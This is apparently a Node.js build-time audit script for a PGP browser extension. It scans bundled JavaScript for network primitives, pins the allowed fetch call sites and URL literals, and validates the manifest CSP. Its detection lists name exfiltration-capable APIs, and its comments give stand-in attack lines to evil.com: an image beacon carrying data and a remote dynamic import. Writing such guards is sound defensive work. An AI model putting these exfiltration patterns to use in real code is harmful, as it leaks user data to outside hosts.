#!/usr/bin/env node
// ──────────────────────────────────────────────────────────────────────
// audit-network.mjs — AST-based post-build supply-chain guard
//
// Parses every JS file in the build output with Babel, walks the AST for
// network-capable constructs, and checks the result against a PER-CONTEXT
// census with EXACT counts. There are two contexts and they get different
// promises:
//
//   worker (background.js)
//     Exactly one `fetch` CALL site beyond the lockdown's own references,
//     and exactly one `https://` origin literal, which must be
//     `https://api.github.com`. That call is the GitHub SSH-key lookup
//     (SECURITY.md §7, §13; T-GITHUB-LOOKUP-DISCLOSURE).
//
//   page (every other .js — side panel, welcome, shared chunks)
//     No `fetch` beyond the two wasm loaders; no XHR / WebSocket /
//     EventSource / RTCPeerConnection / sendBeacon / new Worker /
//     new Function / eval at all; and no absolute URL literal outside a
//     pinned set of XML namespaces and human-facing href targets.
//
// WHY PER-CONTEXT, AND WHY EXACT COUNTS.
// The previous version had one flat allowlist keyed on a path substring
// with a `chunks/` wildcard, and NO notion of destination — it flagged
// `fetch(x)` regardless of what `x` was. Adding a sixth allowlist entry
// for the GitHub call would have downgraded the guarantee from "no
// network" to "no unexpected network" and given the panel no separate
// promise. Worse, it turned out not even to need the sixth entry: the
// lockdown's own `credentials:"omit"` allowlist entry already covered the
// new call site, because the call site also passes `credentials: "omit"`.
// A substring allowlist that broad is not a guard.
//
// Counts are exact rather than upper bounds so that DELETING a guard
// fails as loudly as adding a leak. If a legitimate change moves these
// numbers, change the numbers here in the same commit and say why.
//
// ── WHAT THIS DOES NOT PROVE ──────────────────────────────────────────
//
// 1. This scanner catches DIRECT references only. Alias-based evasion
//    (const f = fetch; f()) is handled at runtime by lib/network-lockdown.ts
//    which hooks the actual APIs. Together they form defence-in-depth:
//      - Scanner:  catches obvious additions a dep shouldn't have
//      - Lockdown: intercepts calls regardless of aliasing/indirection
//
// 2. The URL-literal checks are a CHANGE DETECTOR, not a proof. A URL can
//    be assembled at runtime from fragments ("htt"+"ps://"+host), or built
//    from data that never appears as a literal at all. What the check
//    buys is that the plain, readable way to name a remote destination
//    cannot be added without failing the build. The runtime layers (CSP,
//    then the lockdown) are what actually stop a request.
//
// 3. The panel is NOT "free of network primitives", and this file has
//    never been able to claim that honestly. The wasm loader is a real
//    `fetch`, and the lockdown reads `globalThis.fetch` precisely in order
//    to replace it. The defensible claim is narrower and is the one made
//    here: THE SIDE PANEL BUNDLE CONTAINS NO CODE THAT CAN NAME A REMOTE
//    DESTINATION. Its two fetches take an extension-relative URL; its
//    absolute URL literals are XML namespaces and href targets, neither of
//    which is a connect destination; and `sidepanel.html` pins the panel
//    realm to `connect-src 'self'` with a meta CSP the browser enforces.
//
// Usage:  node scripts/audit-network.mjs [output-dir]
//         Default output-dir: .output/chrome-mv3
//         --census dumps the observed census instead of judging it,
//         which is how you re-pin the numbers below after a real change.
// ──────────────────────────────────────────────────────────────────────
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { parse } from "@babel/parser";
import _traverse from "@babel/traverse";

// Handle both ESM default and CJS interop
const traverse =
  typeof _traverse === "function" ? _traverse : _traverse.default;

const OUTPUT_DIR =
  process.argv.slice(2).find((a) => !a.startsWith("--")) ||
  ".output/chrome-mv3";
// `--census` rather than an env var: turbo.json declares the env vars the
// build may read, and that file is not this script's to edit.
const CENSUS_MODE = process.argv.includes("--census");

// ── Dangerous globals / constructors ────────────────────────────────
// Direct references to these as identifiers are suspicious.
const DANGEROUS_GLOBALS = new Set([
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "RTCPeerConnection",
  "RTCDataChannel",
  "RTCSctpTransport",
  "importScripts",
]);

// Property names that are dangerous when called on an object.
// Only flagged on MemberExpression calls (obj.sendBeacon(), etc.)
const DANGEROUS_METHODS = new Set([
  "sendBeacon", // navigator.sendBeacon
  "createDataChannel", // RTCPeerConnection.createDataChannel
  "createOffer", // RTCPeerConnection.createOffer
  "createAnswer", // RTCPeerConnection.createAnswer
  "setRemoteDescription", // RTCPeerConnection.setRemoteDescription
  "addIceCandidate", // RTCPeerConnection.addIceCandidate
]);

// Dangerous when used with `new`
const DANGEROUS_CONSTRUCTORS = new Set([
  "Worker",
  "SharedWorker",
  "Function", // new Function("return fetch")()
  "Image", // new Image().src = "https://evil.com?data=..."
]);

// ── The one permitted remote origin ─────────────────────────────────
// The GitHub SSH-key lookup. Note this is the ORIGIN; the manifest CSP
// narrows it further to the `/users/` path prefix (which CSP does honour
// — verified: /users/<u>/keys is allowed, /gists is blocked).
const GITHUB_ORIGIN = "https://api.github.com";

// ── Contexts ────────────────────────────────────────────────────────
// `background.js` is the MV3 service worker and is the ONLY file the
// worker realm loads (asserted below: it must have no module imports, so
// Vite cannot have split worker code into a shared chunk). Everything
// else in the build is reachable only from sidepanel.html / welcome.html.
//
// Treating "page" as "every .js that is not background.js" is deliberately
// blunt: it means a new page entrypoint, or a chunk nobody expected, is
// held to the panel's promise by default rather than by being listed.
const WORKER_FILE = "background.js";
const contextOf = (rel) => (rel === WORKER_FILE ? "worker" : "page");

// ── Expected primitive census — EXACT counts ────────────────────────
// Keys are `${kind}:${name}` from the AST scan. Anything observed that is
// not listed, or listed with a different count, fails the build.
//
// worker:
//   ref:fetch   — `const _fetch = globalThis.fetch` in network-lockdown.ts.
//                 The lockdown must read the global to replace it; this is
//                 the reference, not a call.
//   call:fetch  — lib/github/fetch-keys.ts. THE one outbound request.
//
// page:
//   ref:fetch              — the same single lockdown reference, landing in
//                            the shared chunk both pages preload.
//   call:fetch             — exactly two, both wasm loaders (the sidepanel
//                            entry chunk and the wasm-bindgen glue), each
//                            fetching an extension-relative URL.
//   dynamic-import:import() — the code-split import of the local gpg_wasm
//                            chunk. Its specifier is pinned below.
//
// The minifier strips the names off the lockdown's throwing stubs
// (`function XMLHttpRequest(){throw...}` becomes anonymous), which is why
// there are no `ref:XMLHttpRequest`-style entries here. Do not "restore"
// them if a minifier change makes them reappear without checking that the
// stubs are what produced them.
const EXPECTED_CENSUS = {
  worker: {
    "ref:fetch": 1,
    "call:fetch": 1,
  },
  page: {
    "ref:fetch": 1,
    "call:fetch": 2,
    "dynamic-import:import()": 1,
  },
};

// ── Call-site pinning ───────────────────────────────────────────────
// Counts alone would let a leak swap places with a legitimate call. Every
// `call:fetch` and `dynamic-import` finding must ALSO match one of these
// snippets, so a malicious call cannot inherit a neighbour's budget.
const PINNED_CALL_SITES = {
  // The GitHub lookup. `redirect:` is the distinguishing token: the call
  // site refuses GitHub's rename redirects, and nothing else in the build
  // passes that option.
  worker: [{ kind: "call", name: "fetch", snippet: "redirect:" }],
  // Both page fetches are wasm loaders. They are pinned on wasm-bindgen
  // glue idioms (`arrayBuffer()`, `instance:`) rather than on minified
  // identifier names, which change on every unrelated code edit.
  page: [
    // sidepanel entry chunk: fetch the .wasm blob, then initSync it
    { kind: "call", name: "fetch", snippet: "arrayBuffer()" },
    // gpg_wasm chunk: the wasm-bindgen init loader
    { kind: "call", name: "fetch", snippet: "instance:" },
    // the code-split import of the local gpg_wasm chunk
    { kind: "dynamic-import", name: "import()", snippet: "gpg_wasm" },
  ],
};

// ── Expected absolute URL literals — EXACT sets ─────────────────────
// Extracted from the raw source rather than the AST, so a fragment left
// over from string concatenation ("https://" on its own) is still seen.
//
// The panel's set is NOT empty, and pretending otherwise would be the
// dishonest version of this check. What is in it, and why none of it is a
// connect destination:
//
//   http://                      network-lockdown's scheme test
//                                (`url.startsWith("http://")`), not a URL.
//   http://www.w3.org/…          XML/SVG/MathML namespace identifiers.
//                                These are passed to createElementNS /
//                                setAttributeNS; nothing ever fetches them.
//   https://react.dev/errors/    React's minified-error decoder link, put
//                                into a thrown Error's message.
//   https://amibeingpwned.com    our own site, rendered as an href.
//   https://github.com/…         the repo link, rendered as an href.
//   https://developer.chrome.com/…  a documentation link, rendered as an
//                                href, next to the CRX signing UI.
//
// href targets are inert without a click, and `frame-src 'none'` plus the
// panel's `connect-src 'self'` meta CSP mean neither the page nor a
// compromised dependency can turn one into a request. They are listed
// because the point of this check is that the SET does not grow quietly.
const EXPECTED_URL_LITERALS = {
  worker: [
    "http://", //
    GITHUB_ORIGIN,
  ],
  page: [
    "http://",
    "http://www.w3.org/2000/svg",
    "http://www.w3.org/1998/Math/MathML",
    "http://www.w3.org/1999/xlink",
    "http://www.w3.org/XML/1998/namespace",
    "https://react.dev/errors/",
    "https://amibeingpwned.com",
    "https://developer.chrome.com/docs/webstore/update#protect-package-updates",
    "https://github.com/Am-I-Being-Pwned/PGP-Tools",
    // date-fns embeds this doc link in the message it throws when a
    // format string uses a Unicode token. Never fetched; never rendered.
    "https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md",
  ],
};

// ── Collect files by extension ──────────────────────────────────────
function collectFiles(dir, ext) {
  const files = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    const stat = statSync(full);
    if (stat.isDirectory()) {
      files.push(...collectFiles(full, ext));
    } else if (entry.endsWith(ext)) {
      files.push(full);
    }
  }
  return files;
}

// ── Extract source snippet around a node ────────────────────────────
function snippetAt(source, node, contextChars = 80) {
  const start = Math.max(0, node.start - 10);
  const end = Math.min(source.length, node.end + contextChars);
  return source.slice(start, end);
}

// ── Absolute URL literals ───────────────────────────────────────────
// Deliberately scans raw text, not string-literal AST nodes: a fragment
// that is being concatenated is exactly what we want to see.
const ABSOLUTE_URL_RE = /https?:\/\/[^"'`\s\\)>]*/g;

function urlLiteralsIn(source) {
  ABSOLUTE_URL_RE.lastIndex = 0;
  return [...source.matchAll(ABSOLUTE_URL_RE)].map((m) => m[0]);
}

// ── Module specifiers ───────────────────────────────────────────────
// Used only to assert that background.js is self-contained. If Vite ever
// hoists worker code into a shared chunk, the single-file check on the
// GitHub origin literal stops meaning what it says — so fail there first.
const MODULE_SPECIFIER_RE = /\b(?:from|import)\s*["']([^"']+)["']/g;

function moduleSpecifiersIn(source) {
  MODULE_SPECIFIER_RE.lastIndex = 0;
  return [...source.matchAll(MODULE_SPECIFIER_RE)].map((m) => m[1]);
}

// ── Main scan ───────────────────────────────────────────────────────
function scanFile(filePath, relPath) {
  const source = readFileSync(filePath, "utf-8");
  let ast;
  try {
    ast = parse(source, {
      sourceType: "module",
      allowImportExportEverywhere: true,
      plugins: ["dynamicImport", "importMeta"],
      errorRecovery: true,
    });
  } catch (e) {
    console.warn(`  ⚠ Could not parse ${relPath}: ${e.message}`);
    return [];
  }

  const findings = [];

  function addFinding(kind, name, node, detail) {
    const snippet = snippetAt(source, node);
    findings.push({
      file: relPath,
      context: contextOf(relPath),
      kind,
      name,
      detail: detail || name,
      start: node.start,
      end: node.end,
      snippet,
    });
  }

  traverse(ast, {
    // ── Calls: fetch(), navigator.sendBeacon(), window["fetch"]() ──
    CallExpression(path) {
      const callee = path.node.callee;

      // eval()
      if (callee.type === "Identifier" && callee.name === "eval") {
        addFinding("eval", "eval", path.node);
        return;
      }

      // Dynamic import(): import("https://evil.com/x.js")
      // Babel parses this as CallExpression with callee type "Import"
      if (callee.type === "Import") {
        addFinding("dynamic-import", "import()", path.node);
        return;
      }

      // Direct identifier call: fetch(), XMLHttpRequest(), etc.
      if (callee.type === "Identifier" && DANGEROUS_GLOBALS.has(callee.name)) {
        addFinding("call", callee.name, path.node);
        return;
      }

      // Method call: obj.sendBeacon(), obj.createDataChannel(), obj.fetch()
      if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        const prop = callee.property.name;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path.node);
          return;
        }
      }

      // Computed property calls: window["fetch"](), obj["sendBeacon"]()
      if (
        callee.type === "MemberExpression" &&
        callee.computed &&
        callee.property.type === "StringLiteral"
      ) {
        const prop = callee.property.value;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path.node, `computed["${prop}"]`);
        }
      }
    },

    // ── new X(): new WebSocket(), new Worker(), new Function() ──────
    NewExpression(path) {
      const callee = path.node.callee;
      let name = null;

      if (callee.type === "Identifier") {
        name = callee.name;
      } else if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        name = callee.property.name;
      }

      if (
        name &&
        (DANGEROUS_GLOBALS.has(name) || DANGEROUS_CONSTRUCTORS.has(name))
      ) {
        addFinding("new", name, path.node, `new ${name}`);
      }
    },

    // ── Dynamic import() — ImportExpression variant ─────────────────
    ImportExpression(path) {
      addFinding("dynamic-import", "import()", path.node);
    },

    // ── Bare references: const x = fetch (not a call, but captures it) ──
    // Catches alias setup: const f = fetch, const f = globalThis.fetch
    // These are flagged as "ref" so the census can distinguish them
    // from actual calls.
    Identifier(path) {
      if (!DANGEROUS_GLOBALS.has(path.node.name)) return;

      // Skip if this identifier is being called (handled by CallExpression)
      // or constructed (handled by NewExpression)
      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node)
        return;
      if (parent.type === "NewExpression" && parent.callee === path.node)
        return;

      // Skip property access keys: obj.fetch (the "fetch" on the right)
      if (
        parent.type === "MemberExpression" &&
        parent.property === path.node &&
        !parent.computed
      )
        return;

      // Skip object keys: { fetch: value }
      if (parent.type === "ObjectProperty" && parent.key === path.node) return;

      // This is a bare reference — someone is reading the global (likely aliasing)
      addFinding("ref", path.node.name, path.node, `ref:${path.node.name}`);
    },

    // ── MemberExpression: globalThis.fetch, window.WebSocket ────────
    // Catches property access on known global carriers
    MemberExpression(path) {
      if (path.node.computed) return;
      if (path.node.property.type !== "Identifier") return;

      const prop = path.node.property.name;
      if (!DANGEROUS_GLOBALS.has(prop)) return;

      // Skip if parent is already a CallExpression (handled above)
      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node)
        return;

      const obj = path.node.object;
      // Only flag on known global carriers
      if (
        obj.type === "Identifier" &&
        (obj.name === "globalThis" ||
          obj.name === "window" ||
          obj.name === "self")
      ) {
        addFinding("ref", prop, path.node, `${obj.name}.${prop}`);
      }
    },
  });

  return findings;
}

// ── CSS scanner ─────────────────────────────────────────────────────
// Catches exfiltration via url(), @import, @font-face pointing externally.
// CSP img-src/font-src blocks these at runtime, but we flag them at build
// time too so a malicious dep can't rely on a future CSP loosening.
const EXTERNAL_URL_RE = /url\(\s*["']?(https?:\/\/|\/\/)/gi;
const IMPORT_RE = /@import\s+(?:url\()?["']?(https?:\/\/|\/\/)/gi;

function scanCssFile(filePath, relPath) {
  const source = readFileSync(filePath, "utf-8");
  const findings = [];

  for (const re of [EXTERNAL_URL_RE, IMPORT_RE]) {
    re.lastIndex = 0;
    let match;
    while ((match = re.exec(source)) !== null) {
      const start = Math.max(0, match.index - 20);
      const end = Math.min(source.length, match.index + match[0].length + 80);
      findings.push({
        file: relPath,
        context: contextOf(relPath),
        kind: "css-url",
        name: "external-url",
        detail: "external URL in CSS",
        start: match.index,
        end: match.index + match[0].length,
        snippet: source.slice(start, end),
      });
    }
  }
  return findings;
}

// ── Manifest / HTML validator ───────────────────────────────────────
// Ensures the built manifest.json still carries the policy the audit
// story rests on. A malicious build plugin could strip or weaken any of
// it, and a generated manifest is exactly the kind of file a reviewer
// skims rather than reads.
function validateManifest(outputDir) {
  const manifestPath = join(outputDir, "manifest.json");
  let manifest;
  try {
    manifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
  } catch {
    console.error("  ⚠ Could not read manifest.json");
    return ["manifest.json not found or invalid"];
  }

  const csp = manifest.content_security_policy?.extension_pages ?? "";
  const errors = [];

  // Each directive must contain at least one of the acceptable tokens.
  // 'none' is strictly stronger than 'self' and always acceptable.
  const required = [
    ["default-src", ["'self'", "'none'"]],
    ["script-src", ["'self'"]],
    ["img-src", ["'self'", "'none'"]],
    ["font-src", ["'self'", "'none'"]],
    ["worker-src", ["'self'", "'none'"]],
    ["frame-src", ["'none'"]],
    ["form-action", ["'none'"]],
    ["object-src", ["'self'", "'none'"]],
  ];

  const escape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  for (const [directive, values] of required) {
    const matched = values.some((v) =>
      new RegExp(`${directive}\\s+[^;]*${escape(v)}`).test(csp),
    );
    if (!matched) {
      errors.push(
        `Missing or wrong: ${directive} must include one of ${values.join(", ")}`,
      );
    }
  }

  // connect-src must be EXACTLY the extension origin plus the one
  // path-prefixed GitHub endpoint. Not a substring test: `'self'
  // https://api.github.com/` (no path) or a second origin appended would
  // both pass a containment check and both widen the worker's reach.
  //
  // CSP path-prefix matching is real and was measured: with this policy
  // /users/<u>/keys returns 200 and /gists is blocked. What it does NOT
  // constrain is the query string — /users/x/keys?leak=SECRET is allowed
  // (measured). That residual is inherent to CSP and is recorded as
  // T-GITHUB-CSP-SCOPE rather than papered over here.
  const EXPECTED_CONNECT_SRC = `connect-src 'self' ${GITHUB_ORIGIN}/users/`;
  const connectDirective = csp
    .split(";")
    .map((d) => d.trim().replace(/\s+/g, " "))
    .find((d) => d.startsWith("connect-src"));
  if (connectDirective !== EXPECTED_CONNECT_SRC) {
    errors.push(
      `connect-src must be exactly "${EXPECTED_CONNECT_SRC}", got ${
        connectDirective === undefined ? "(absent)" : `"${connectDirective}"`
      }`,
    );
  }

  // script-src must NOT have 'unsafe-eval' (wasm-unsafe-eval is ok)
  if (
    /script-src\s+[^;]*'unsafe-eval'/.test(csp) &&
    !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)
  ) {
    errors.push("script-src must not include 'unsafe-eval'");
  }

  // The GitHub lookup needs NO host permission: api.github.com answers
  // unauthenticated and sends `access-control-allow-origin: *` (measured:
  // 200 with `x-ratelimit-limit: 60`, the anonymous limit). So both keys
  // must be ABSENT, not merely small. A build step that promotes one is
  // close to invisible in a review of a generated manifest diff, and a
  // host permission would silently attach the user's cookies-and-all
  // origin privileges to a request we deliberately make anonymous.
  for (const key of ["host_permissions", "optional_host_permissions"]) {
    if (key in manifest) {
      errors.push(
        `${key} must be ABSENT (got ${JSON.stringify(manifest[key])}) -- the GitHub lookup is unauthenticated CORS and needs no host permission`,
      );
    }
  }

  // The manifest CSP is extension-WIDE, so widening it for the worker
  // widens it for the panel too. `sidepanel.html` pulls the panel realm
  // back to `connect-src 'self'` with a meta CSP. Meta CSP can only
  // tighten, never loosen, and the browser enforces it — this is NOT the
  // same-realm hook problem of §8.10, because it is not our JS doing the
  // enforcing. Verified in a real build: with the manifest widened, the
  // WORKER fetch returned 200 while the same fetch from the PANEL failed.
  const panelHtmlPath = join(outputDir, "sidepanel.html");
  try {
    const html = readFileSync(panelHtmlPath, "utf-8");
    const normalized = html.replace(/\s+/g, " ");
    const hasMeta =
      /<meta\s+http-equiv="Content-Security-Policy"\s+content="[^"]*connect-src 'self'[^"]*"/.test(
        normalized,
      );
    if (!hasMeta) {
      errors.push(
        'sidepanel.html must carry <meta http-equiv="Content-Security-Policy" content="connect-src \'self\'"> -- without it the panel inherits the worker\'s api.github.com allowance',
      );
    }
  } catch {
    errors.push("sidepanel.html not found in build output");
  }

  return errors;
}

// ── Run ─────────────────────────────────────────────────────────────
try {
  statSync(OUTPUT_DIR);
} catch {
  console.error(`ERROR: Build output not found at ${OUTPUT_DIR}`);
  console.error("       Run the build first, then re-run this script.");
  process.exit(1);
}

const jsFiles = collectFiles(OUTPUT_DIR, ".js");
const cssFiles = collectFiles(OUTPUT_DIR, ".css");

if (jsFiles.length === 0) {
  console.error(`ERROR: No .js files found in ${OUTPUT_DIR}`);
  process.exit(1);
}

const allFindings = [];
const urlLiterals = { worker: new Map(), page: new Map() };
const githubOriginFiles = [];
let workerFileSeen = false;
const structureErrors = [];

for (const file of jsFiles) {
  const rel = relative(OUTPUT_DIR, file);
  const ctx = contextOf(rel);
  const source = readFileSync(file, "utf-8");

  allFindings.push(...scanFile(file, rel));

  for (const url of urlLiteralsIn(source)) {
    const seen = urlLiterals[ctx];
    if (!seen.has(url)) seen.set(url, []);
    if (!seen.get(url).includes(rel)) seen.get(url).push(rel);
  }

  if (source.includes(GITHUB_ORIGIN)) githubOriginFiles.push(rel);

  if (ctx === "worker") {
    workerFileSeen = true;
    // Self-containment. lib/github/fetch-keys.ts is imported only by the
    // background entry, so Vite has no reason to hoist it into a shared
    // chunk — and this check is what makes that reasoning load-bearing
    // instead of merely likely. Deliberately NOT an import-graph walker:
    // the blunt version fails loudly the day someone imports that module
    // from the panel, which is exactly the day you want to be told.
    const specifiers = moduleSpecifiersIn(source);
    if (specifiers.length > 0) {
      structureErrors.push(
        `${rel} is no longer self-contained -- it imports ${specifiers.join(", ")}. Worker code has been split into a shared chunk, so the "one file names api.github.com" guarantee no longer holds. Re-derive it before editing this script.`,
      );
    }
  }
}

for (const file of cssFiles) {
  const rel = relative(OUTPUT_DIR, file);
  allFindings.push(...scanCssFile(file, rel));
}

if (!workerFileSeen) {
  structureErrors.push(
    `${WORKER_FILE} not found in the build output -- the worker context could not be audited at all.`,
  );
}

// ── Census mode: dump, don't judge ──────────────────────────────────
if (CENSUS_MODE) {
  for (const ctx of ["worker", "page"]) {
    console.log(`\n── ${ctx} ──`);
    const counts = {};
    for (const f of allFindings.filter((f) => f.context === ctx)) {
      const sig = `${f.kind}:${f.name}`;
      counts[sig] = (counts[sig] ?? 0) + 1;
      console.log(`   ${f.file}  ${sig}`);
      console.log(`   │ ${f.snippet.replace(/\s+/g, " ").slice(0, 140)}`);
    }
    console.log(`   counts: ${JSON.stringify(counts)}`);
    console.log(
      `   urls: ${JSON.stringify([...urlLiterals[ctx].keys()], null, 2)}`,
    );
  }
  process.exit(0);
}

// ── Check the census, exactly ───────────────────────────────────────
const censusErrors = [];
const unexpected = [];

for (const ctx of ["worker", "page"]) {
  const expected = EXPECTED_CENSUS[ctx];
  const observed = {};
  for (const f of allFindings.filter((f) => f.context === ctx)) {
    const sig = `${f.kind}:${f.name}`;
    observed[sig] = (observed[sig] ?? 0) + 1;
  }

  for (const sig of new Set([
    ...Object.keys(expected),
    ...Object.keys(observed),
  ])) {
    const want = expected[sig] ?? 0;
    const got = observed[sig] ?? 0;
    if (want !== got) {
      censusErrors.push(
        `[${ctx}] expected exactly ${want} × ${sig}, found ${got}`,
      );
    }
  }

  // Pin every call/dynamic-import to a known site, so a leak cannot
  // occupy a legitimate call's slot in the count.
  const pins = PINNED_CALL_SITES[ctx] ?? [];
  for (const f of allFindings.filter(
    (f) =>
      f.context === ctx && (f.kind === "call" || f.kind === "dynamic-import"),
  )) {
    const pinned = pins.some(
      (p) =>
        p.kind === f.kind && p.name === f.name && f.snippet.includes(p.snippet),
    );
    if (!pinned) unexpected.push(f);
  }

  // Anything the scanner found that is not a call, an import or a ref is
  // unexpected by construction (eval, new Worker, new Function, css-url…).
  for (const f of allFindings.filter(
    (f) =>
      f.context === ctx &&
      f.kind !== "call" &&
      f.kind !== "dynamic-import" &&
      f.kind !== "ref",
  )) {
    unexpected.push(f);
  }
}

// ── Check the URL literal sets, exactly ─────────────────────────────
const urlErrors = [];
for (const ctx of ["worker", "page"]) {
  const expected = new Set(EXPECTED_URL_LITERALS[ctx]);
  const observed = urlLiterals[ctx];

  for (const [url, files] of observed) {
    if (!expected.has(url)) {
      urlErrors.push(
        `[${ctx}] UNEXPECTED absolute URL literal ${JSON.stringify(url)} in ${files.join(", ")}`,
      );
    }
  }
  for (const url of expected) {
    if (!observed.has(url)) {
      urlErrors.push(
        `[${ctx}] expected absolute URL literal ${JSON.stringify(url)} is gone -- if that was deliberate, remove it from EXPECTED_URL_LITERALS in the same commit`,
      );
    }
  }
}

// The worker's https:// literals must be exactly the one allowed origin.
const workerHttpsLiterals = [...urlLiterals.worker.keys()].filter((u) =>
  u.startsWith("https://"),
);
if (
  workerHttpsLiterals.length !== 1 ||
  workerHttpsLiterals[0] !== GITHUB_ORIGIN
) {
  urlErrors.push(
    `[worker] expected exactly one https:// origin literal (${GITHUB_ORIGIN}), found ${JSON.stringify(workerHttpsLiterals)}`,
  );
}

// Exactly one file in the WHOLE build may name that origin, and it is the
// worker bundle. See the self-containment check above for why a ten-line
// test is enough here.
if (
  githubOriginFiles.length !== 1 ||
  githubOriginFiles[0] !== WORKER_FILE ||
  contextOf(githubOriginFiles[0]) !== "worker"
) {
  urlErrors.push(
    `${GITHUB_ORIGIN} must appear in exactly one built file (${WORKER_FILE}); found in ${JSON.stringify(githubOriginFiles)}`,
  );
}

// Validate the manifest and the panel's meta CSP
const cspErrors = validateManifest(OUTPUT_DIR);

// ── Report ──────────────────────────────────────────────────────────
console.log("");

if (unexpected.length > 0) {
  console.log("❌ UNEXPECTED NETWORK PRIMITIVES DETECTED");
  console.log(
    "   These matched no pinned call site and may indicate a supply-chain attack.\n",
  );
  for (const f of unexpected) {
    console.log(
      `   [${f.context}] ${f.file}:${f.start}  [${f.kind}] ${f.detail}`,
    );
    const trimmed = f.snippet.replace(/\s+/g, " ").slice(0, 120);
    console.log(`   │ ${trimmed}…`);
    console.log("");
  }
}

if (censusErrors.length > 0) {
  console.log("❌ PER-CONTEXT CENSUS MISMATCH");
  console.log(
    "   Counts are exact on purpose: a removed guard fails as loudly as an added leak.\n",
  );
  for (const err of censusErrors) console.log(`   • ${err}`);
  console.log("");
}

if (urlErrors.length > 0) {
  console.log("❌ ABSOLUTE URL LITERAL MISMATCH");
  console.log(
    "   A change detector, not a proof -- a URL can still be assembled at runtime.\n",
  );
  for (const err of urlErrors) console.log(`   • ${err}`);
  console.log("");
}

if (structureErrors.length > 0) {
  console.log("❌ BUILD STRUCTURE CHANGED");
  console.log("   The audit's assumptions about the bundle no longer hold.\n");
  for (const err of structureErrors) console.log(`   • ${err}`);
  console.log("");
}

if (cspErrors.length > 0) {
  console.log("❌ MANIFEST / PANEL POLICY VALIDATION FAILED");
  console.log(
    "   The built manifest.json or sidepanel.html has been weakened.\n",
  );
  for (const err of cspErrors) console.log(`   • ${err}`);
  console.log("");
}

const workerFindings = allFindings.filter((f) => f.context === "worker").length;
const pageFindings = allFindings.filter((f) => f.context === "page").length;

console.log("── Summary ──────────────────────────────────");
console.log(`   JS files scanned:   ${jsFiles.length}`);
console.log(`   CSS files scanned:  ${cssFiles.length}`);
console.log(`   worker findings:    ${workerFindings}`);
console.log(`   page findings:      ${pageFindings}`);
console.log(`   worker URL sites:   ${urlLiterals.worker.size}`);
console.log(`   page URL sites:     ${urlLiterals.page.size}`);
console.log(`   Unexpected:         ${unexpected.length}`);
console.log(`   Census errors:      ${censusErrors.length}`);
console.log(`   URL errors:         ${urlErrors.length}`);
console.log(`   Structure errors:   ${structureErrors.length}`);
console.log(`   CSP errors:         ${cspErrors.length}`);
console.log("");

const failed =
  unexpected.length +
  censusErrors.length +
  urlErrors.length +
  structureErrors.length +
  cspErrors.length;

if (failed > 0) {
  console.log("⚠️  Re-run with --census to see the observed census.");
  console.log(
    "   If the change is legitimate, update EXPECTED_CENSUS / PINNED_CALL_SITES /",
  );
  console.log(
    "   EXPECTED_URL_LITERALS in scripts/audit-network.mjs in the SAME commit,",
  );
  console.log(
    "   and say why in the message. If it is not, a dependency may be",
  );
  console.log(
    "   exfiltrating data, or a build plugin may have weakened the CSP.",
  );
  process.exit(1);
}

console.log(
  "✅ worker: 1 pinned fetch to api.github.com and no other https origin.",
);
console.log(
  "✅ page:   no code that can name a remote destination; 2 wasm loaders only.",
);
console.log(
  "✅ manifest: connect-src exact, no host permissions, panel meta CSP present.",
);
